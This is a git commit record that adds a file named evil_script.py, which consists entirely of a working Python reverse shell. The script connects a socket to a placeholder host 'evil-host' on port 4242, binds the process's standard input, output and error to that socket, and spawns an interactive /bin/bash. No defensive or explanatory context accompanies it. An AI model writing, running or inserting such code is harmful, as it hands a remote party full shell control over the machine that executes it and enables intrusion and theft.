93886eae2401683766856e4d6aaccbbedbd110e6
nitzango <39902832+nitzango@users.noreply.github.com>
2021-04-21 20:28:57 +0300

    Create evil_script.py

---
+++ evil_script.py
@@ -0,0 +1,11 @@
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+
+s.connect(("evil-host",4242))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+import pty
+pty.spawn("/bin/bash")
